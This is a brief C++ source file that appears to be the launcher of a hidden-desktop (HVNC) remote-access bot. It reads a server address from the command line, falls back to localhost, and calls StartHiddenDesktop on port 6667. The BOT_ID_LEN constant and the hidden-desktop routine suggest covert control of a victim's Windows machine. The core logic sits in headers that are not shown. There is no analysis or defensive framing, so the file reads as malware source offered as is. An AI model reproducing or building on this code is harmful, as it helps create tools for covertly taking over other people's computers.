#pragma (linker, "/defaultlib:ntdll.lib")
#define BOT_ID_LEN 35

#define SECURITY_WIN32
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <WinInet.h>
#include <TlHelp32.h>
#include <Security.h>
#include <Psapi.h>
#include<string>


#include <cstring>
#include <iostream>
#include <Shlwapi.h>

#include "Utils.h"


#include "HiddenDesktop.h"



int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR szCmdLine,int iCmdShow) 

{
	char* server;
	if (strlen(szCmdLine) > 0)
	{
		server = szCmdLine;
	}
	else {
		server = (char*)"127.0.0.1";
	}
	std::cout << server;
	StartHiddenDesktop(server, 6667);
}
